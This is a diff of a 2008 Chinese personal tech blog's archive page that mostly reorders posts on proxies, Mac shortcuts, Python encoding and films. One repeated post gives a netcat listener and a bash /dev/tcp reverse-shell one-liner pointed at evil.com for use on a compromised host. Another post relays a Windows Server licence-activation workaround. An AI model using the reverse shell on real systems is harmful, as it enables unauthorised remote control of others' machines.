@@ -54,6 +54,25 @@
         <!-- new article -->
         <div class="card blog-card">
           <article class="card-body">
+            <a href="/archives/544014"  rel="bookmark" >
+              <h2 class="card-title">让squid, privoxy, polipo, varnish见鬼去吧，我用3proxy！</h2>
+            </a>
+            <p class="card-text"><p>说说为啥子要选择<a href="http://3proxy.ru/">3proxy</a>。说到代理，Windows下第一反映就是CCProxy，当然Linux下就是著名的squid。但是squid其实是一种cache，用来单纯做代理似乎有点浪费，而且我们做代理并不需要很强大的cache功能，相反，很多时候我们希望禁用掉cache，所以我选择了3proxy，只有HTTP代理功能，小巧方便。</p>
+<p>同样的开源产品有TinyProxy，但是TinyProxy不支持父级socks代理，而且安全漏洞也比3proxy多。</p>
+<p>使用3Proxy一般是为了给intranet搭建上游代理为socks的HTTP代理网关。例如TOR或者SSH。</p>
+<p>官方网站：<a href="http://3proxy.ru/">http://3proxy.ru/</a><br />
+下载：<a href="http://3proxy.ru/download/">http://3proxy.ru/download/</a><br />
+配置文档：<a href="http://3proxy.ru/doc/html/man3/3proxy.cfg.3.html">http://3proxy.ru/doc/html/man3/3proxy.cfg.3.html</a></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-04-27T00:00:00+08:00">2008-04-27</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
             <a href="/archives/627372"  rel="bookmark" >
               <h2 class="card-title">好久不blogging了，改行twitter了</h2>
             </a>
@@ -71,65 +90,21 @@
         <!-- new article -->
         <div class="card blog-card">
           <article class="card-body">
-            <a href="/archives/627373"  rel="bookmark" >
-              <h2 class="card-title">【原创】Mac OS X Leopard 10.5.2 OSX86 从零入门笔记</h2>
+            <a href="/archives/626948"  rel="bookmark" >
+              <h2 class="card-title">bash下超小反弹式后门</h2>
             </a>
-            <p class="card-text"><p><a href="http://isohunt.com/torrent_details/39354389/10.5.2?tab=summary">Kalyway</a>的10.5.2 osx86光盘出来了，下载、安装、折腾期间等屏幕进度条的时间，花了2个小时把《Mac OS X从入门到精通》看完了。感觉和当年看Windows入门差不多。这本书虽然是讲 10.2 的OS X系统，但是不少操作还是通用的，就像当年我抱一本清华的Win98教程学习WinME和XP一样。</p>
-<pre><code>* 首先是按键对应。由于Apple电脑用的不是普通PC的104键盘，所以教程里的按键名称对应如下：
-</code></pre>
-<p>⌥ = Option = Alt<br />
-⇧ = Shift = Shift<br />
-⌘ = Command/Apple = Win<br />
-^ = Control = Ctrl<br />
-  * Ctrl+单击=右击<br />
-  * 多选图标：shift+拖选；⌘+拖选<br />
-  * 有些程序支持“四连击”<br />
-  * ⌘+O激活一个选定图标<br />
-  * Shift+单击 = ⌘+单击<br />
-  * Option+拖动 = 复制。普通拖动：移动。不同盘之间是复制<br />
-  * Option+⌘+拖动：创建alias<br />
-  * 窗口左上角从左至右依次是：关闭 最小 最大<br />
-  * ⌘+W关闭子窗口/标签页 ⌘+M最小化 Shift+⌘+M：慢动作最小化<br />
-  * 窗口上的图标可以当文件拖动<br />
-  * ⌘+拖动窗口标题栏：不激活后面的窗口移动位置<br />
-  * Dock的内容：Application Aliases, Running Applications, File Aliases, Dock Extra(也称Docklings)<br />
-  * 把一个程序放到前台，其他程序放到后台：⌘+Option+Dock单击<br />
-  * ⌘+Tab 切换程序 ⌘+Shift+Tab反向切换<br />
-  * Finder = Mac下的explorer<br />
-  * 强制推出一个程序：⌘+Option+Escape<br />
-  * Option+拖动 = 同时改变几个分栏的宽度<br />
-  * Finder里：Shift+⌘+H打开 <em>H</em> ome。同理有： <em>C</em> omputer， <em>A</em> pplications，Networ <em>k</em> ， <em>U</em> tillities。 <em>G</em> oto Folder<br />
-  * Finder里⌘+I 查看文件信息<br />
-  * 新建文件夹⌘+Shift+N<br />
-  * ⌘+D 建立文件的duplicate<br />
-  * 复制 - 粘贴 - 撤销 ⌘+C ⌘+V ⌘+Z<br />
-  * collection：字体集<br />
-  * admin = wheel = superuser = root<br />
-  * Terminal里：⌘+↑↓滚动屏幕；PageUp/PageDown上下翻页 ⌘+数字 多个Terminal之间切换<br />
-  * Terminal里Ctrl+A 光标移动到开头 Ctrl+E光标移动到结尾<br />
-  * Ctrl+U 清楚光标前所有文字<br />
-  * !50 执行bash history里第50个命令（我连这个都忘记了，囧）<br />
-  * Mac里文件路径表示， : 和 / 的作用一样<br />
-  * ~kir/ k表示用户kirk的主目录</p>
-<p>好了，Mac OS X基本上手了。过几天开始研究<a href="http://en.wikipedia.org/wiki/Cocoa_%28API%29">Cocoa</a>、TextMate、Coda之类好玩的东西。</p>
-<p>还是对OSx86不支持T2300e双核和AD1981HD声卡表示遗憾</p></p>
-            <div class="card-subtext muted-text">
-              <p>Posted <time datetime="2008-04-27T00:00:00+08:00">2008-04-27</time></p>
-<p>archive</p>            </div>
-          </article>
-        </div>
-
-
-        <!-- new article -->
-        <div class="card blog-card">
-          <article class="card-body">
-            <a href="/archives/626959"  rel="bookmark" >
-              <h2 class="card-title">Parallax scrolling</h2>
-            </a>
-            <p class="card-text"><p><a href="http://therissingtonpodcast.co.uk/">http://therissingtonpodcast.co.uk/</a> 改变浏览器窗口大小注意看背景图片</p>
-<p><a href="http://silverbackapp.com/">http://silverbackapp.com/</a> 同理</p>
-<p>非常有意思的技术。真是把div的layer特性用得淋漓尽致啊。</p>
-<p>教程：<a href="http://www.thinkvitamin.com/features/design/how-to-recreate-silverbacks-parallax">http://www.thinkvitamin.com/features/design/how-to-recreate-silverbacks-parallax</a></p></p>
+            <p class="card-text"><p>今天GNUCITIZEN上有一篇非常handy的文章 <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">Reverse Shell with Bash</a></p>
+<p>在自己电脑上<br />
+<code>nc -l -p 8080 -vvv</code></p>
+<p>然后在肉鸡上<br />
+<code>$ exec 5&lt;&gt;/dev/tcp/evil.com/8080
+$ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></p>
+<p>就得到反弹式shell了。</p>
+<p>实验了一下，不成功。<a href="http://www.linuxsir.org/main/doc/abs/abs3.7cnhtm/devproc.html#FTN.AEN14624">搜索</a>了下，原来编译bash的时候需要加一个 <code>--enable-net-redirections</code> 选项才能使用 /dev/tcp/ 这个特性。nnd。</p>
+<p>这种方法的特点是：不需要任何第三方工具，在肉鸡上留下非常少量的脚板印</p>
+<p>有空看一下可否通过binary hack来搞定这个选项。</p>
+<p>另外GNUCITIZEN的配图都好酷啊，比如这篇文章的<a href="http://flickr.com/photos/asolomon16/403446322/">配图</a>：<br />
+<img alt="freebsd shells" src="http://static.flickr.com/128/403446322_27502dffa2.jpg" /></p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2008-04-20T00:00:00+08:00">2008-04-20</time></p>
 <p>archive</p>            </div>
@@ -201,21 +176,13 @@ Bad guys, good guys and sort of okay guys... what's your style?</p>
         <!-- new article -->
         <div class="card blog-card">
           <article class="card-body">
-            <a href="/archives/626948"  rel="bookmark" >
-              <h2 class="card-title">bash下超小反弹式后门</h2>
+            <a href="/archives/626959"  rel="bookmark" >
+              <h2 class="card-title">Parallax scrolling</h2>
             </a>
-            <p class="card-text"><p>今天GNUCITIZEN上有一篇非常handy的文章 <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">Reverse Shell with Bash</a></p>
-<p>在自己电脑上<br />
-<code>nc -l -p 8080 -vvv</code></p>
-<p>然后在肉鸡上<br />
-<code>$ exec 5&lt;&gt;/dev/tcp/evil.com/8080
-$ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></p>
-<p>就得到反弹式shell了。</p>
-<p>实验了一下，不成功。<a href="http://www.linuxsir.org/main/doc/abs/abs3.7cnhtm/devproc.html#FTN.AEN14624">搜索</a>了下，原来编译bash的时候需要加一个 <code>--enable-net-redirections</code> 选项才能使用 /dev/tcp/ 这个特性。nnd。</p>
-<p>这种方法的特点是：不需要任何第三方工具，在肉鸡上留下非常少量的脚板印</p>
-<p>有空看一下可否通过binary hack来搞定这个选项。</p>
-<p>另外GNUCITIZEN的配图都好酷啊，比如这篇文章的<a href="http://flickr.com/photos/asolomon16/403446322/">配图</a>：<br />
-<img alt="freebsd shells" src="http://static.flickr.com/128/403446322_27502dffa2.jpg" /></p></p>
+            <p class="card-text"><p><a href="http://therissingtonpodcast.co.uk/">http://therissingtonpodcast.co.uk/</a> 改变浏览器窗口大小注意看背景图片</p>
+<p><a href="http://silverbackapp.com/">http://silverbackapp.com/</a> 同理</p>
+<p>非常有意思的技术。真是把div的layer特性用得淋漓尽致啊。</p>
+<p>教程：<a href="http://www.thinkvitamin.com/features/design/how-to-recreate-silverbacks-parallax">http://www.thinkvitamin.com/features/design/how-to-recreate-silverbacks-parallax</a></p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2008-04-20T00:00:00+08:00">2008-04-20</time></p>
 <p>archive</p>            </div>
@@ -438,22 +405,6 @@ OK<br />
         <!-- new article -->
         <div class="card blog-card">
           <article class="card-body">
-            <a href="/archives/626148"  rel="bookmark" >
-              <h2 class="card-title">大三下综合症爆发老</h2>
-            </a>
-            <p class="card-text"><p>浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～</p>
-<p>天天逃课～～～没专心研究技术～～～～～～整天一手迅雷一手KMPlayer一手刷douban～～～～堕落啊堕落～～～～</p>
-<p>读书真害人，老子整死不读研了！</p></p>
-            <div class="card-subtext muted-text">
-              <p>Posted <time datetime="2008-04-07T00:00:00+08:00">2008-04-07</time></p>
-<p>archive</p>            </div>
-          </article>
-        </div>
-
-
-        <!-- new article -->
-        <div class="card blog-card">
-          <article class="card-body">
             <a href="/archives/626149"  rel="bookmark" >
               <h2 class="card-title">黑客书架最顶上的9½本书</h2>
             </a>
@@ -479,6 +430,22 @@ OK<br />
 <img alt="9" src="http://lobelia.douban.com/mpic/s2222510.jpg" /><br />
   10. <a href="http://www.douban.com/subject/1787222/">The Ultimate Hitchhiker's Guide</a><br />
 <img alt="0" src="http://lobelia.douban.com/mpic/s1658642.jpg" /></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-04-07T00:00:00+08:00">2008-04-07</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/archives/626148"  rel="bookmark" >
+              <h2 class="card-title">大三下综合症爆发老</h2>
+            </a>
+            <p class="card-text"><p>浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～浮躁～</p>
+<p>天天逃课～～～没专心研究技术～～～～～～整天一手迅雷一手KMPlayer一手刷douban～～～～堕落啊堕落～～～～</p>
+<p>读书真害人，老子整死不读研了！</p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2008-04-07T00:00:00+08:00">2008-04-07</time></p>
 <p>archive</p>            </div>
@@ -662,16 +629,14 @@ things are done now, I guess I'd better learn how to do it."</p>
         <!-- new article -->
         <div class="card blog-card">
           <article class="card-body">
-            <a href="/archives/625808"  rel="bookmark" >
-              <h2 class="card-title">[python]解决xmpp.simplexml出现xml.parsers.expat.ExpatError: not well-formed</h2>
+            <a href="/archives/625801"  rel="bookmark" >
+              <h2 class="card-title">Knights of the Force!</h2>
             </a>
-            <p class="card-text"><p>编码问题一直是非纯Unicode编程语言的痛！</p>
-<p>做一个小东西的时候用到了 xmpppy，有一句代码是：<br />
-<code>oob = xmpp.simplexml.XML2Node( u'&lt;x xmlns="jabber ![:x](http://static.blogcn.com/wp-includes/images/smilies/icon_mad.gif) ![:o](http://static.blogcn.com/wp-includes/images/smilies/icon_surprised.gif) ob"&gt;&lt;url&gt;http://labs.dormforce.net/services/&lt;/url&gt;&lt;desc&gt;测试&lt;/desc&gt;&lt;/x&gt;' )</code></p>
-<p>调试的时候老是出现 'ascii' codec can't encode characters in position 65-66: ordinal not in range(12 <img alt="8)" src="http://static.blogcn.com/wp-includes/images/smilies/icon_cool.gif" /></p>
-<p>调试了很久发现xmpp的库源码没有使用utf-8，打开 <code>_python_lib_path_ /xmpp/simplexml.py</code> ，在开头添加一句<code>#coding:utf-8</code></p>
-<p>问题解决。</p>
-<p>一般来说，彻底搞定Python的编码有3个地方要检查：1. 控制台编码 2. 文件保存编码 3. 文件编码标志</p></p>
+            <p class="card-text"><object height="355" width="425"><param name="movie" value="http://www.youtube.com/v/l3eqP6RE3-8&amp;hl=en"/>
+<param name="wmode" value="transparent"/>
+<embed height="355" src="http://www.youtube.com/v/l3eqP6RE3-8&amp;hl=en" type="application/x-shockwave-flash" width="425" wmode="transparent"/></object>
+
+<p>一个土耳其<a href="http://www.starwars.com">星战</a>迷，一个人用了n年，基于Jedia Academy的引擎重建了Star Wars 六部曲里所有战争场景和任务造型，并且做成了<a href="http://kotf.com/main/download.htm">mod</a>（1.2GB），超赞啊～～</p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2008-03-31T00:00:00+08:00">2008-03-31</time></p>
 <p>archive</p>            </div>
@@ -724,14 +689,16 @@ things are done now, I guess I'd better learn how to do it."</p>
         <!-- new article -->
         <div class="card blog-card">
           <article class="card-body">
-            <a href="/archives/625801"  rel="bookmark" >
-              <h2 class="card-title">Knights of the Force!</h2>
+            <a href="/archives/625808"  rel="bookmark" >
+              <h2 class="card-title">[python]解决xmpp.simplexml出现xml.parsers.expat.ExpatError: not well-formed</h2>
             </a>
-            <p class="card-text"><object height="355" width="425"><param name="movie" value="http://www.youtube.com/v/l3eqP6RE3-8&amp;hl=en"/>
-<param name="wmode" value="transparent"/>
-<embed height="355" src="http://www.youtube.com/v/l3eqP6RE3-8&amp;hl=en" type="application/x-shockwave-flash" width="425" wmode="transparent"/></object>
-
-<p>一个土耳其<a href="http://www.starwars.com">星战</a>迷，一个人用了n年，基于Jedia Academy的引擎重建了Star Wars 六部曲里所有战争场景和任务造型，并且做成了<a href="http://kotf.com/main/download.htm">mod</a>（1.2GB），超赞啊～～</p></p>
+            <p class="card-text"><p>编码问题一直是非纯Unicode编程语言的痛！</p>
+<p>做一个小东西的时候用到了 xmpppy，有一句代码是：<br />
+<code>oob = xmpp.simplexml.XML2Node( u'&lt;x xmlns="jabber ![:x](http://static.blogcn.com/wp-includes/images/smilies/icon_mad.gif) ![:o](http://static.blogcn.com/wp-includes/images/smilies/icon_surprised.gif) ob"&gt;&lt;url&gt;http://labs.dormforce.net/services/&lt;/url&gt;&lt;desc&gt;测试&lt;/desc&gt;&lt;/x&gt;' )</code></p>
+<p>调试的时候老是出现 'ascii' codec can't encode characters in position 65-66: ordinal not in range(12 <img alt="8)" src="http://static.blogcn.com/wp-includes/images/smilies/icon_cool.gif" /></p>
+<p>调试了很久发现xmpp的库源码没有使用utf-8，打开 <code>_python_lib_path_ /xmpp/simplexml.py</code> ，在开头添加一句<code>#coding:utf-8</code></p>
+<p>问题解决。</p>
+<p>一般来说，彻底搞定Python的编码有3个地方要检查：1. 控制台编码 2. 文件保存编码 3. 文件编码标志</p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2008-03-31T00:00:00+08:00">2008-03-31</time></p>
 <p>archive</p>            </div>
@@ -1645,6 +1612,22 @@ qeRiUv8BAA8ABr33PxcSHh7kWxmQga8naQsy<br />
         <!-- new article -->
         <div class="card blog-card">
           <article class="card-body">
+            <a href="/archives/624401"  rel="bookmark" >
+              <h2 class="card-title">【有图有真相】《The Bourne Identity 谍影重重》 里的人民币</h2>
+            </a>
+            <p class="card-text"><p><img alt="13.JPG" src="http://image-001.yo2cdn.com/wp-content/uploads/74/7487/2008/02/13.JPG" /></p>
+<p><img alt="2.JPG" src="http://image-001.yo2cdn.com/wp-content/uploads/74/7487/2008/02/2.JPG" /></p>
+<p>由于遭受未知来源的ARP攻击全校断网了几个小时，于是看电影打发时间。结果很火星的在《<a href="http://www.douban.com/subject/1304102/">谍影重重</a>》发现了人民币，看来外国特务潜入我国比较频繁啊。大概在主角Bourne进银行拿到了自己的箱子，打开一堆钞票的时候，哇～～～</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-02-29T00:00:00+08:00">2008-02-29</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
             <a href="/archives/624402"  rel="bookmark" >
               <h2 class="card-title">[IE]去掉“此页包含安全和非安全项目”提示</h2>
             </a>
@@ -1659,22 +1642,6 @@ qeRiUv8BAA8ABr33PxcSHh7kWxmQga8naQsy<br />
 <p>顺便发现微软一个很搞笑的<a href="http://support.microsoft.com/kb/184960/en-us">KB184960</a>，它说这个提示是：<br />
 This behavior is by design. You cannot disable this error message.</p>
 <p>最后吼一句：有没有谁知道一种系统tweak软件，能够根据调节的动作自动生成reg/bat/vbs/inf文件？并且支持通过WMI和远程注册表来调节？</p></p>
-            <div class="card-subtext muted-text">
-              <p>Posted <time datetime="2008-02-29T00:00:00+08:00">2008-02-29</time></p>
-<p>archive</p>            </div>
-          </article>
-        </div>
-
-
-        <!-- new article -->
-        <div class="card blog-card">
-          <article class="card-body">
-            <a href="/archives/624401"  rel="bookmark" >
-              <h2 class="card-title">【有图有真相】《The Bourne Identity 谍影重重》 里的人民币</h2>
-            </a>
-            <p class="card-text"><p><img alt="13.JPG" src="http://image-001.yo2cdn.com/wp-content/uploads/74/7487/2008/02/13.JPG" /></p>
-<p><img alt="2.JPG" src="http://image-001.yo2cdn.com/wp-content/uploads/74/7487/2008/02/2.JPG" /></p>
-<p>由于遭受未知来源的ARP攻击全校断网了几个小时，于是看电影打发时间。结果很火星的在《<a href="http://www.douban.com/subject/1304102/">谍影重重</a>》发现了人民币，看来外国特务潜入我国比较频繁啊。大概在主角Bourne进银行拿到了自己的箱子，打开一堆钞票的时候，哇～～～</p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2008-02-29T00:00:00+08:00">2008-02-29</time></p>
 <p>archive</p>            </div>
@@ -1703,23 +1670,27 @@ This behavior is by design. You cannot disable this error message.</p>
         <!-- new article -->
         <div class="card blog-card">
           <article class="card-body">
-            <a href="/archives/624306"  rel="bookmark" >
-              <h2 class="card-title">Product key error</h2>
+            <a href="/archives/624293"  rel="bookmark" >
+              <h2 class="card-title">stackless, threads, stack, whatever</h2>
             </a>
-            <p class="card-text"><p>安装Windows Server 2008，本来想用OEM的方法激活，但是可耻的失败了。</p>
-<p>---------------------------<br />
-Product key error<br />
----------------------------<br />
-The product key you have entered will not work with this edition of Windows Server®.</p>
-<p>You must either run Windows Server® Setup or enter a Windows Server® Standard product key.<br />
----------------------------<br />
-OK<br />
----------------------------</p>
-<p>网上有<a href="http://www.vistafans.com/viewthread.php?tid=242637">OEM激活的教程</a>：由于Windows Server 2008和 Windows Vista SP1用的是<a href="http://blogs.itecn.net/blogs/smallfrogs/archive/2008/02/15/windows-vista-sp1-windows-server-2008.aspx">同一个内核</a>，所以可以先安装一个HP OEM Vista，然后把这两个文件替换Server 2008的同名文件<br />
-%WinDir%\System32\Licensing\pkeyconfig\pkeyconfig.xrm-ms<br />
-%WinDir%\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\SoftwareLicensing\tokens.dat<br />
-再用OEM激活，据说有人成功过。但是缺点是：Server 2008变成了workstation版本，例如 我的电脑 - 服务器管理 变成了计算机管理，<a href="http://www.vistafans.com/viewthread.php?tid=244938">IIS和AD也不是服务器版本的</a></p>
-<p>那么，我还需要再装一次Vista么，囧</p></p>
+            <p class="card-text"><p>再写一个comet-like Web app的时候，无意中翻到了上古神器<a href="http://code.google.com/p/eurasia/">Eurasia3</a>，也翻到了stackless，每次碰到stackless就小小的震撼一下，就像阳光照不到的阴暗角落，不知道哪里有什么样稀奇古怪的东西。还是在IBM developerWorks上翻到了一点支离破碎的东西（<a href="http://www-128.ibm.com/developerworks/cn/linux/sdk/python/python-7/">中文</a> | <a href="http://www.ibm.com/developerworks/library/l-pyth7.html">英文</a>）：</p>
+<blockquote>
+<p>Mertz：Stackless Python 确切来说是什么？有什么初学者可以理解的概念能够解释有关 Stackless 的不同之处？</p>
+<p>Tismer：Stackless Python 是一种不在 C 堆栈上保存状态的 Python 实现。它的确有堆栈 -- 要多少有多少 -- 但这些是 Python 堆栈。</p>
+<p>C 堆栈不能从例如 C 这样的语言以干净的方式进行修改，除非以预期的顺序进行。它对您施加了很大限制：您必须回到这里，与您离开的方向正好相反。</p>
+<p>“普通的”程序员一开始不会认为这是个限制。他们必须从开始就要学会将想法转向堆栈。堆栈没有什么坏处，并且通常它们施加的执行顺序就是实际上的顺序，但这并不意味着我们必须等待一个这样的堆栈序列完成才能运行另一序列。</p>
+<p>程序员在必须执行非阻塞调用和回调时意识到这一点。堆栈突然挡住去路，我们必须使用线程，或将状态明确存储在对象中，或者构建显式的可切换堆栈等等。Stackless 的目的是帮助程序员避免这些问题。</p>
+<p>Mertz: Exactly what is Stackless Python? Is there something a beginner can get his or her mind around that explains what is different about Stackless?</p>
+<p>Tismer: Stackless Python is a Python implementation that does not save state on the C stack. It does have stacks -- as many as you want -- but these are Python stacks.</p>
+<p>The C stack cannot be modified in a clean way from a language like C, unless you do it in the expected order. It imposes a big obligation on you: You will come back, exactly here, exactly in the reverse way as you went off.</p>
+<p>"Normal" programmers do not see this as a restriction in the first place. They have to learn to push their minds onto stacks from the outset. There is nothing bad about stacks, and usually their imposed execution order is the way to go, but that does not mean that we have to wait for one such stack sequence to complete before we can run a different one.</p>
+<p>Programmers realize this when they have to do non-blocking calls and callbacks. Suddenly the stack is in the way, we must use threads, or explicitly store state in objects, or build explicit, switchable stacks, and so on. The aim of Stackless is to deliver the programmer from these problems.</p>
+</blockquote>
+<p>还是一片空白啊。但是感觉HTML - CGI - AJAX这一些东西一路过来，可能对并发编程有相当大的促进吧？加上现在的comet，简直是颠覆性的东西。</p>
+<p>顺便看了一下文章发表的时间：<br />
+David Mertz (mertz@gnosis.cx), President, Gnosis Software, Inc.</p>
+<p><strong>01 Oct 2000</strong></p>
+<p>瞬间觉得自己超级渺小。8年前我在做什么？跟老师在昏暗沉闷的微机室学习DOS, WPS……Guido在1989圣诞节无聊写了个python出来。Tismer在1999无聊写了个stackless</p></p>
             <div class="card-subtext muted-text">
               <p>Posted <time datetime="2008-02-26T00:00:00+08:00">2008-02-26</time></p>
 <p>archive</p>            </div>
